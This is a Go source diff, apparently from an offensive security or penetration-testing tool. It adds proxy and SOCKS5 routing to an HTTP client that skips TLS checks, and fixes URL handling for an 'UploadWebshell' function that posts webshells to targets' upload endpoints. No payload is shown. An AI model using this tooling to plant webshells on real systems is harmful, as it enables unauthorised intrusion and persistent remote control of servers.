@@ -27,6 +27,12 @@ type DeepClient struct {
 // NewDeepClient builds a client that ignores TLS errors (targets are often
 // self-signed) and does not follow redirects.
 func NewDeepClient(timeout time.Duration) *DeepClient {
+	return NewDeepClientWithProxy(timeout, "")
+}
+
+// NewDeepClientWithProxy is NewDeepClient with every request routed through a
+// proxy (http/https or socks5), e.g. while testing carried out over a tunnel.
+func NewDeepClientWithProxy(timeout time.Duration, proxy string) *DeepClient {
 	if timeout <= 0 {
 		timeout = 15 * time.Second
 	}
@@ -35,6 +41,11 @@ func NewDeepClient(timeout time.Duration) *DeepClient {
 		DisableKeepAlives:   true,
 		TLSHandshakeTimeout: timeout,
 		DialContext:         (&net.Dialer{Timeout: 5 * time.Second}).DialContext,
+	}
+	if proxy = strings.TrimSpace(proxy); proxy != "" {
+		if u, err := url.Parse(proxy); err == nil && u.Host != "" {
+			tr.Proxy = http.ProxyURL(u)
+		}
 	}
 	return &DeepClient{client: &http.Client{
 		Transport: tr,
@@ -604,6 +615,22 @@ type UploadResult struct {
 	Note       string
 }
 
+// normalizeUploadURL pins a bare origin (http://host:port) to "/". Through an
+// HTTP proxy the origin-form request line becomes absolute-form; servers that
+// route by path (openresty, most upload scripts) then answer the index page
+// with 200 while never running the upload handler.
+func normalizeUploadURL(raw string) string {
+	raw = strings.TrimSpace(raw)
+	u, err := url.Parse(raw)
+	if err != nil || u.Scheme == "" || u.Host == "" {
+		return raw
+	}
+	if u.Path == "" {
+		u.Path = "/"
+	}
+	return u.String()
+}
+
 // UploadWebshell posts a webshell to an upload endpoint. When fieldName is
 // empty the file is sent as the raw request body.
 func UploadWebshell(ctx context.Context, c *DeepClient, uploadURL, fieldName, fileName string, content []byte, extra map[string]string, headers map[string]string) UploadResult {
@@ -612,6 +639,7 @@ func UploadWebshell(ctx context.Context, c *DeepClient, uploadURL, fieldName, fi
 		res.Note = "缺少上传地址"
 		return res
 	}
+	uploadURL = normalizeUploadURL(uploadURL)
 	var body io.Reader
 	reqHeaders := map[string]string{}
 	for k, v := range headers {
